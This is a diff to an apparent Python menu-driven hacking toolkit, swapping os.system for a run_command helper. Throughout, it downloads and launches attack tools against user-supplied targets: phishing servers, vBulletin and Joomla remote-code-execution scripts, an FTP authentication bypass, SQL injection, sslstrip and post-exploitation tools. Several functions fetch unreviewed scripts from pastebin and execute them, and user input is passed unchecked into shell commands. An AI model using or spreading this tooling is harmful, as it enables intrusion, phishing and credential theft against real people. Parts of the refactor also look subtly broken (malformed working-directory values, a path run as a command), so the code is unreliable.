@@ -1071,17 +1071,18 @@ class brutex:
         return (os.path.isdir(self.installDir))
 
     def install(self):
-        os.system("git clone --depth=1 %s %s" %
+        run_command("git clone --depth=1 %s %s" %
                   (self.gitRepo, self.installDir))
         if not os.path.isdir("/usr/share/brutex"):
             os.makedirs("/usr/share/brutex")
-        os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)
+        run_command("chmod +x install.sh", cwd="$%s" % self.installDir)
+        run_command("./install.sh", cwd="$%s" % self.installDir)
 
     def run(self):
         target = raw_input("Enter Target IP: ").split(' ')[0]
         try:
             socket.gethostbyname(target)
-            os.system("brutex %s" % target)
+            run_command("brutex %s" % target)
         except KeyboardInterrupt:
             fsociety()
 
@@ -1100,11 +1101,11 @@ class arachni:
         return (os.path.isdir(self.installDir))
 
     def install(self):
-        os.system("git clone --depth=1 %s %s" %
+        run_command("git clone --depth=1 %s %s" %
                   (self.gitRepo, self.installDir))
-        os.system("cd %s/" % self.installDir)
-        os.system(
-            "gem install bundler && bundle install --without prof && rake install")
+        run_command("%s/" % self.installDir)
+        run_command(
+            "gem install bundler && bundle install --without prof && rake install", cwd="$%s" % self.installDir)
 
     def run(self):
         target = raw_input("Enter Target Hostname: ").split(' ')[0]
@@ -1117,7 +1118,7 @@ class arachni:
             url = urlparse(test_target)
             socket.gethostbyname(url.netloc)
             target = url.scheme + '://' + url.netloc + url.path
-            os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
+            run_command("arachni %s --output-debug 2> %sarachni/%s.log" %
                 (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
         except KeyboardInterrupt:
             fsociety()
@@ -1128,23 +1129,23 @@ class arachni:
 def weeman():
     print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
     if yesOrNo():
-        os.system(
-            "git clone --depth=1 https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
+        run_command("git clone --depth=1 https://github.com/samyoyo/weeman.git")
+        run_command("python weeman.py", cwd="weeman")
     else:
         fsociety()
 
 
 def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
-    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
+    run_command("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     common_commands = ['get','put','list','GET','PUT','LIST']
-    os.system("python gabriel.py")
+    run_command("python gabriel.py")
     ftpbypass = raw_input("Enter Target IP and Use Command:").split(' ')
     try:
         socket.gethostbyname(ftpbypass[0])
         if ftpbypass[1] in common_commands:
-            os.system("python gabriel.py %s %s" % (ftpbypass[0],ftpbypass[1]))
+            run_command("python gabriel.py %s %s" % (ftpbypass[0],ftpbypass[1]))
         else:
             print 'Command Error!!. Please check the Use command.'
             fsociety()
@@ -1153,9 +1154,9 @@ def gabriel():
 
 
 def sitechecker():
-    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
+    run_command("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
     clearScr()
-    os.system("python ch01.py")
+    run_command("python ch01.py")
 
 
 def ifinurl():
@@ -1179,18 +1180,18 @@ def bsqlbf():
             cbsq = test_target.scheme + '://' + test_target.netloc + test_target.path
         else:
             cbsq = test_target.netloc + test_target.path
-        os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
-        os.system("perl bsqlbf.pl -url %s" % cbsq)
-        os.system("rm bsqlbf.pl")
+        run_command("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
+        run_command("perl bsqlbf.pl -url %s" % cbsq)
+        run_command("rm bsqlbf.pl")
     except KeyboardInterrupt:
         fsociety()
 
 def atscan():
     print ("Do You To Install ATSCAN ?")
     if yesOrNo():
-        os.system("rm -rf ATSCAN")
-        os.system(
-            "git clone --depth=1 https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
+        run_command("rm -rf ATSCAN")
+        run_command("git clone --depth=1 https://github.com/AlisamTechnology/ATSCAN.git")
+        run_command("perl atscan.pl", cwd="ATSCAN")
     else:
         fsociety()
 
@@ -1199,28 +1200,25 @@ def commix():
     print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print ("usage: python commix.py --help")
     if yesOrNo():
-        os.system(
-            "git clone --depth=1 https://github.com/stasinopoulos/commix.git commix")
-        os.system("cd commix")
-        os.system("python commix.py")
-        os.system("")
+        run_command("git clone --depth=1 https://github.com/stasinopoulos/commix.git commix")
+        run_command("python commix.py", cwd="commix")
     else:
         informationGatheringMenu.completed("Commix")
 
 
 def vbulletinrce():
-    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
-    os.system("perl tmp.pl")
+    run_command("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
+    run_command("perl tmp.pl")
 
 
 def joomlarce():
-    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
+    run_command("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
     jmtarget = raw_input("Select a targets list:").split(' ')[0]
     try:
         if os.path.exists(jmtarget):
-            os.system("python temp.py %s" % jmtarget)
+            run_command("python temp.py %s" % jmtarget)
     except KeyboardInterrupt:
         fsociety()
 
@@ -1229,17 +1227,17 @@ def inurl():
     output = raw_input("select a file to save:").split(' ')[0]
     all_dorks = ['dork:', 'dork-file:', 'exploit-cad:', 'range:', 'range-rand:', 'irc:', 'exploit-all-id:', 'exploit-vul-id:', 'exploit-get:', 'exploit-post:', 'regexp-filter:', 'exploit-command:', 'command-all:', 'command-vul:', 'replace:', 'remove:', 'regexp:', 'sall:', 'sub-file:', 'sub-get::', 'sub-concat:', 'user-agent:', 'url-reference:', 'delay:', 'sendmail:', 'time-out:', 'http-header:', 'ifcode:', 'ifurl:', 'ifemail:', 'mp:', 'target:', 'no-banner::', 'gc::', 'proxy:', 'proxy-file:', 'time-proxy:', 'pr::', 'proxy-http-file:', 'update::', 'info::', 'help::', 'unique::', 'popup::', 'ajuda::', 'install-dependence::', 'cms-check::', 'sub-post::', 'robots::', 'alexa-rank::', 'beep::', 'exploit-list::', 'tor-random::', 'shellshock::', 'dork-rand:', 'sub-cmd-all:', 'sub-cmd-vul:', 'port-cmd:', 'port-scan:', 'port-write:', 'ifredirect:', 'persist:', 'file-cookie:', 'save-as:']
     if dork in all_dorks:
-        os.system(
+        run_command(
             "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
         webHackingMenu.completed("InurlBR")
 
 
 def insinurl():
-    os.system(
+    run_command(
         "git clone --depth=1 https://github.com/googleinurl/SCANNER-INURLBR.git")
-    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
-    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
-    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
+    run_command("chmod +x SCANNER-INURLBR/inurlbr.php")
+    run_command("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
+    run_command("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
     clearScr()
     inurl()
 
@@ -1253,7 +1251,7 @@ def jboss():
     print ("usage: ./e.sh target_ip tcp_port ")
     print("Continue: y/n")
     if yesOrNo():
-        os.system(
+        run_command(
             "git clone --depth=1 https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
     else:
         fsociety()
@@ -1296,7 +1294,7 @@ def wppluginscan():
 def sqlmap():
     print ("usage: python sqlmap.py -h")
     if yesOrNo():
-        os.system(
+        run_command(
             "git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
     else:
         informationGatheringMenu.completed("SQLMap")
@@ -1340,8 +1338,8 @@ def shelltarget():
 def poet():
     print("POET is a simple POst-Exploitation Tool.\n")
     if yesOrNo():
-        os.system("git clone --depth=1 https://github.com/mossberg/poet.git")
-        os.system("python poet/server.py")
+        run_command("git clone --depth=1 https://github.com/mossberg/poet.git")
+        run_command("python poet/server.py")
     else:
         postExploitationMenu.completed("POET")
 
@@ -1351,9 +1349,9 @@ def ssls():
     attacks.
     It requires Python 2.5 or newer, along with the 'twisted' python module.''')
     if yesOrNo():
-        os.system("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
-        os.system("apt-get install python-twisted-web")
-        os.system("python sslstrip/setup.py")
+        run_command("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
+        run_command("apt-get install python-twisted-web")
+        run_command("python sslstrip/setup.py")
     else:
         sniffingSpoofingMenu.completed("SSlStrip")
 
@@ -1419,9 +1417,9 @@ def gravity():
 def shellnoob():
     print('''Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!''')
     if yesOrNo():
-        os.system("git clone --depth=1 https://github.com/reyammer/shellnoob.git")
-        os.system("mv shellnoob/shellnoob.py shellnoob.py")
-        os.system("python shellnoob.py --install")
+        run_command("git clone --depth=1 https://github.com/reyammer/shellnoob.git")
+        run_command("mv shellnoob/shellnoob.py shellnoob.py")
+        run_command("python shellnoob.py --install")
     else:
         exploitationToolsMenu()
 
@@ -1431,10 +1429,10 @@ def androidhash():
     salt = raw_input("Enter the android salt: ").split(' ')[0]
     symbols = ['!','@','#','$','%','^','&','*','(',')','-','=','+','|','||','&&','/','//','+', ' ']
     if [symbol for symbol in symbols if symbol not in key and symbol not in salt] == symbols:
-        os.system(
+        run_command(
             "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
-        os.system(
-            "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
+        run_command(
+            "python AndroidPINCrack.py -H %s -s %s" % (key, salt), cwd="AndroidPINCrack")
     else:
         print 'Hash or Slat Error. Please check the hash and salt.'
         fsociety()
@@ -1445,23 +1443,23 @@ def cmsfew():
     target = raw_input("Select a target: ").split(' ')[0]
     try:
         socket.gethostbyname(target)
-        os.system(
+        run_command(
             "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
-        os.system("python cms.py %s" % target)
+        run_command("python cms.py %s" % target)
     except KeyboardInterrupt:
         fsociety()
 
 
 def smtpsend():
-    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
+    run_command("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
     clearScr()
-    os.system("python smtp.py")
+    run_command("python smtp.py")
 
 
 def pisher():
-    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
+    run_command("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
     clearScr()
-    os.system("python pisher.py")
+    run_command("python pisher.py")
 
 
 menuu = fsocietylogo + '''
